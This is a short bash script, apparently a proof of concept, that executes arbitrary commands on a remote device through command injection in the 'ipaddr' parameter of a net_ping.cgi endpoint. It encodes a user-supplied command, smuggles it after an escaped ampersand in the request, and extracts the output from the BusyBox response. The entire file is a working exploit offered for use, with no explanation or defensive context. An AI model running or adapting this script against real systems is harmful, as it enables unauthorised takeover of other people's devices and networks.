
#!/bin/bash

# Ensure the user provided input
if [ -z "$1" ] || [ -z "$2" ]; then
     echo "Usage: ./poc_rce.sh <url> '<command>'"
     echo "./poc_rce.sh  127.0.0.1 'id'"
     exit 1
fi

# Ensure the URL ends with a '/'
url="$1"
if [ "$url" != */ ]; then
  url="$url/"
fi

# Define the target command (passed as an argument)
COMMAND=$2

# URL encode the command
ENCODED_COMMAND=$(echo -n "$COMMAND" | sed -e 's/ /%20/g' -e 's/&/%26/g' -e 's/"/%22/g' -e 's/\\/\\\\/g')


# Send the request and extract the command output
curl -s "${url}cgi-bin/net_ping.cgi?ipaddr=127.0.0.1%5C%5C%26${ENCODED_COMMAND}%22"    | \
grep -b1 'BusyBox' | head -n 1 | cut -d'-' -f2-
